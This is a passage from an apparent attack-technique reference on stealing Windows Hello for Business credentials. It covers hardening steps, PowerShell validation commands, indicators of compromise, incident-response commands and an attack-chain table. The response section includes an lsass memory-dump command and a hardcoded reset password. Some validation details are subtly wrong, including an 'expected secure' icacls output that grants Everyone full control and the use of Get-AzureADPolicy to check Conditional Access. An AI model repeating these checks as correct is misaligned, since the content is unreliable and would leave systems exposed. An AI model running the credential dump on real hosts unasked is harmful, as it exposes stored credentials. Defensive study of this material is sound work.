    ```

*   **Require MFA for Entra ID Sign-in:** Enforce phishing-resistant MFA (FIDO2 keys or Windows Hello) and block legacy authentication.
    
    **Manual Steps (Conditional Access Policy):**
    1. Go to **Azure Portal** → **Entra ID** → **Security** → **Conditional Access**
    2. Click **+ New policy**
    3. Name: `Require MFA for All Users`
    4. **Assignments:**
       - Users: **All users**
       - Cloud apps: **All cloud apps**
    5. **Conditions:**
       - Require authentication strength: **Phishing-resistant MFA**
    6. **Access controls:**
       - Grant: **Require multifactor authentication**
    7. Enable policy: **On**
    8. Click **Create**

*   **Block Legacy Authentication Protocols:** Disable Basic Auth, NTLM, and unencrypted protocols.
    
    **Manual Steps (Entra ID - Block Legacy Auth):**
    1. Go to **Azure Portal** → **Entra ID** → **Conditional Access**
    2. Create new policy: `Block Legacy Authentication`
    3. **Assignments:**
       - Users: **All users**
       - Cloud apps: **Office 365**
    4. **Conditions:**
       - Client apps: **Exchange ActiveSync clients**, **Other clients**
    5. **Access controls:**
       - Block access
    6. Enable and **Create**

#### Access Control & Policy Hardening

*   **RBAC: Minimize Global Admin Assignments:** Limit Global Administrator role to cloud-only accounts (non-synchronized from on-premises).
    
    **Manual Steps (Remove Hybrid Global Admins):**
    1. Go to **Azure Portal** → **Entra ID** → **Roles and administrators**
    2. Click **Global Administrator**
    3. For each member where **Directory synced**: **Yes**, click to **Remove**
    4. Re-assign role only to cloud-only users
    5. Click **Update**

*   **Conditional Access: Device Compliance Requirement:** Require devices to be marked as compliant before allowing access to sensitive resources.
    
    **Manual Steps:**
    1. Go to **Azure Portal** → **Conditional Access** → **+ New policy**
    2. Name: `Require Compliant Device`
    3. Assignments: All users, All apps
    4. Grant: **Require device to be marked as compliant**
    5. Enable and **Create**

*   **BitLocker Encryption:** Encrypt all disks to prevent offline DPAPI attacks requiring physical access.
    
    **Manual Steps (Enable BitLocker via Group Policy):**
    1. Open **gpmc.msc**
    2. Navigate to **Computer Configuration** → **Policies** → **Administrative Templates** → **Windows Components** → **BitLocker Drive Encryption**
    3. Enable: **Require BitLocker to be enabled**
    4. Set TPM startup: **Require TPM only**
    5. Apply: `gpupdate /force`

#### Validation Command (Verify Fixes)

```powershell
# 1. Verify no local admins except essential accounts
Get-LocalGroupMember -Group "Administrators" | Where-Object { $_.ObjectClass -eq "User" }

# 2. Verify TPM is enabled
Get-WmiObject -Namespace "root\cimv2\security\microsofttpm" -Class Win32_Tpm | Select-Object IsActivated_InitialValue, IsEnabled_InitialValue

# 3. Verify NGC audit is configured
icacls "C:\Windows\ServiceProfiles\LocalService\AppData\Local\Microsoft\Ngc"

# 4. Verify Entra ID MFA policy is active
Get-AzureADPolicy | Where-Object { $_.DisplayName -like "*MFA*" }

# 5. Verify legacy auth is blocked
Get-AzureADPolicy | Where-Object { $_.DisplayName -like "*Legacy*" }
```

**Expected Output (If Secure):**
```
# Output 1: Only SYSTEM, Administrators (built-in), and critical service accounts
Name                 ObjectClass
----                 -----------
DESKTOP\Administrator User
DESKTOP\Service_Acct User

# Output 2: TPM enabled
IsActivated_InitialValue : True
IsEnabled_InitialValue   : True

# Output 3: SACL configured
(F) Everyone:(F:CI)(AD)

# Output 4: MFA policy exists
DisplayName            : Require MFA for All Users
State                  : Enabled

# Output 5: Legacy Auth blocked
DisplayName            : Block Legacy Authentication
State                  : Enabled
```

---

## 15. DETECTION & INCIDENT RESPONSE

#### Indicators of Compromise (IOCs)

*   **Files:**
    - `C:\Temp\NGC_Backup\` (copied NGC database)
    - `C:\Windows\Temp\Keys_*` (extracted key containers)
    - `C:\Temp\mimikatz.exe` (credential dumper)
    - `%TEMP%\Rubeus.exe` (token manipulation tool)

*   **Registry:**
    - `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run` (persistence mechanisms)
    - `HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU` (recent command history)

*   **Network:**
    - Outbound HTTPS to `login.microsoftonline.com` from unexpected source
    - Kerberos TGT requests from non-domain-joined IPs
    - LDAP queries from unauthorized accounts

#### Forensic Artifacts

*   **Disk:**
    - `C:\Windows\ServiceProfiles\LocalService\AppData\Local\Microsoft\Ngc\` (biometric database)
    - `C:\Windows\ServiceProfiles\LocalService\AppData\Local\Microsoft\Ngc\$SID\CacheData` (cached PRT)
    - NTFS Change Journa (USN Journal) entries for NGC directory modifications
    - Disk slack and unallocated space for deleted NGC files

*   **Memory:**
    - LSASS process dump (`lsass.dmp`) containing cached credentials
    - mimikatz process memory for decrypted keys
    - Token objects in kernel memory

*   **Cloud:**
    - AuditData in Microsoft Purview Audit Log showing unusual token requests
    - Azure Activity Log showing role assignments from compromised account
    - Entra ID Sign-in Logs showing successful logins from unusual IP/location

*   **Event Logs:**
    - Event ID 4656 (File Object Access) - NGC folder opened
    - Event ID 4663 (File Operation) - NGC files read/written
    - Event ID 4673 (Sensitive Privilege Use) - SYSTEM account accessing user data
    - Event ID 4688 (Process Creation) - mimikatz or Rubeus launched
    - Event ID 4720 (User Account Created) - New privileged account created
    - Event ID 4722 (User Account Enabled) - Disabled account re-enabled

#### Response Procedures

1.  **Isolate:**
    
    **Command (Local):**
    ```powershell
    # Disconnect network adapter
    Disable-NetAdapter -Name "Ethernet" -Confirm:$false
    
    # Or force network isolation via firewall
    New-NetFirewallRule -DisplayName "Isolate Device" -Direction Inbound -Action Block -Enabled $true
    ```
    
    **Manual (Azure):**
    - Go to **Azure Portal** → **Virtual Machines** → Select VM → **Networking** → **Add inbound port rule** → **Deny** **All** traffic

2.  **Collect Evidence:**
    
    **Command:**
    ```powershell
    # Export Security Event Log
    wevtutil epl Security C:\Evidence\Security.evtx
    
    # Capture NGC directory
    robocopy "C:\Windows\ServiceProfiles\LocalService\AppData\Local\Microsoft\Ngc" "C:\Evidence\NGC" /E /R:0
    
    # Create memory dump of lsass
    procdump64.exe -ma lsass.exe C:\Evidence\lsass.dmp
    
    # Capture running processes and network connections
    tasklist /v > C:\Evidence\tasklist.txt
    netstat -anob > C:\Evidence\netstat.txt
    ```
    
    **Manual:**
    - Open **Event Viewer** → Right-click **Security** → **Save All Events As** → `C:\Evidence\Security.evtx`
    - Open **Disk Management** → Right-click affected disk → **Properties** → Enable **Detailed Logging**
    - Use **Azure Portal** → **Virtual Machines** → **Capture** to create VM snapshot

3.  **Remediate:**
    
    **Command:**
    ```powershell
    # Kill suspicious processes
    Stop-Process -Name "mimikatz" -Force -ErrorAction SilentlyContinue
    Stop-Process -Name "Rubeus" -Force -ErrorAction SilentlyContinue
    
    # Delete extracted NGC files
    Remove-Item -Path "C:\Temp\NGC_Backup" -Recurse -Force -ErrorAction SilentlyContinue
    Remove-Item -Path "C:\Temp\Keys_*" -Recurse -Force -ErrorAction SilentlyContinue
    
    # Reset all user passwords
    Set-LocalUser -Name "admin" -Password (ConvertTo-SecureString "NewSecurePassword123!" -AsPlainText -Force)
    
    # Force PRT revocation (Entra ID)
    Revoke-AzureADUserAllRefreshToken -ObjectId (Get-AzureADUser -Filter "UserPrincipalName eq 'admin@company.com'").ObjectId
    ```
    
    **Manual:**
    - Go to **Azure Portal** → **Entra ID** → **Users** → Select **Affected User** → **Revoke sessions**
    - Reset affected user passwords in **Entra ID** and **Active Directory**
    - Re-enroll Windows Hello (delete existing enrollment and re-register biometrics/PIN)
    - Restore VM from clean backup if available

---

## 16. RELATED ATTACK CHAIN

| Step | Phase | Technique | Description |
|---|---|---|---|
| **1** | **Initial Access** | [IA-PHISH-001] Device Code Phishing | Attacker phishes credentials to gain initial foothold |
| **2** | **Privilege Escalation** | [PE-EXPLOIT-001] PrintNightmare or [PE-TOKEN-002] RBCD | Attacker escalates to local admin or domain admin |
| **3** | **Credential Access** | **[WHFB-001]** | **Current Step: Extract Windows Hello credential material** |
| **4** | **Lateral Movement** | [LM-AUTH-001] Pass-the-Hash or [LM-AUTH-004] Pass-the-PRT | Attacker uses stolen PRT to authenticate to cloud services |
| **5** | **Persistence** | [PE-ACCTMGMT-014] Global Admin Backdoor or [CA-FORGE-001] Golden SAML | Attacker establishes persistent cloud access |
| **6** | **Impact** | Data Exfiltration via [CA-TOKEN-004] Graph API or Ransomware via [PE-POLICY-003] Azure Management Group Escalation | Final objective: steal/encrypt sensitive data |

---

## 17. REAL-WORLD EXAMPLES

#### Example 1: ERNW Research - Windows Hello Face-Swap Attack (2025)

- **Target:** Global enterprise with Hybrid AD deployment
- **Timeline:** July 2025 (ERNW Black Hat presentation)
- **Technique Status:** ACTIVE - Demonstrated by Dr. Baptiste David and Tillmann Oßwald against production Windows 11 systems
- **Impact:** Attackers with local admin access could bypass facial recognition for domain administrators, enabling unauthorized cloud access
- **Reference:** [ERNW Blog - Windows Hello for Business Face Swap](https://insinuator.net/2025/07/windows-hello-for-business-the-face-swap/)

#### Example 2: Microsoft Security Advisory - PIN Brute-Force (2022)

- **Target:** Organizations using Windows Hello PIN without TPM
- **Timeline:** August 2022 (Elcomsoft disclosure)
- **Technique Status:** ACTIVE - 4-digit PINs can be brute-forced in ~2 minutes, 6-digit in ~2:20 minutes
- **Impact:** Offline PIN attacks via boot device (USB) allowed full credential compromise
- **Reference:** [Elcomsoft Blog - Windows Hello: No TPM No Security](https://blog.elcomsoft.com/2022/08/windows-hello-no-tpm-no-security/)

#### Example 3: CVE-2021-34466 - Facial Recognition Bypass (2021)

- **Target:** Windows Hello biometric users
- **Timeline:** March 2021 (CyberArk Labs discovery)
- **Technique Status:** FIXED in some versions via ESS, PARTIAL on non-ESS devices
- **Impact:** Attackers with physical access could spoof facial recognition using custom USB device injecting IR images
- **Reference:** [BleepingComputer - Microsoft Fixes Windows Hello Authentication Bypass](https://www.bleepingcomputer.com/news/security/microsoft-fixes-windows-hello-authentication-bypass-vulnerability/)

---